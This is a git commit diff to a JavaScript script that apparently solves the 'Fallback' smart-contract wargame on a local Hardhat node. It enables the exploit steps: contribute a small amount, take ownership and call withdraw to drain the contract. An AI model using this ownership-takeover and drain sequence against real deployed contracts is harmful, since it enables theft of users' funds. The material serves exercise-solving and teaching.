5320fc7e1bec22ef94c3ef3f3496b1084fba8305
Meeshbhoombah <rohanmishra2017@gmail.com>
2025-09-15 10:57:09 -0400

    Updated contract object creation to use signer

--- 01/index.js
+++ 01/index.js
@@ -5,11 +5,8 @@ export default async function (providerUrl, contractAddress) {
   // Connect to local Hardhat node
   const provider = new ethers.JsonRpcProvider(providerUrl);
 
-  // Get the first account as signer
   const accounts = await provider.listAccounts();
   const signer = await provider.getSigner(1);
-
-  console.log(signer.address);
 
   // Create a contract instance
   const Fallback = new ethers.Contract(
@@ -19,42 +16,11 @@ export default async function (providerUrl, contractAddress) {
       "function withdraw() external",
       "function owner() public view returns (address)"
     ],
-    provider
+    signer
   );
 
-  // Example: read owner
-  const owner = await Fallback.owner();
-  console.log("Owner:", owner);
-
-  /*
-  const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");
-
-  const signer = await provider.getSigner(19);
-
-  const Fallback = new ethers.Contract(contractAddress, [
-    "function contribute() external payable",
-    "function withdraw() external",
-    "function owner() view returns (address)"
-  ], signer);
-  */
-
-  /*
-  // Fetch deployed bytecode
-  const bytecode = await provider.getCode(contractAddress);
-
-  console.log("Deployed bytecode at address", contractAddress, ":\n");
-  console.log(bytecode);
-
-  if (bytecode === "0x") {
-    console.log("\n⚠️ No contract found at this address. Maybe it’s not deployed on this network.");
-  }
-  */
-
-  /*
   console.log("Current contract owner address:", await Fallback.owner());
-
-  const attackerAddress = signer.address;
-  console.log("Attacker address:", attackerAddress);
+  console.log("Attacker address:", signer.address);
 
   // Step 1: Contribute
   await (await Fallback.contribute({ value: ethers.parseEther("0.0001") })).wait();
@@ -69,6 +35,6 @@ export default async function (providerUrl, contractAddress) {
   await (await Fallback.withdraw()).wait();
 
   console.log("Exploit complete!");
-  */
+
 }
 
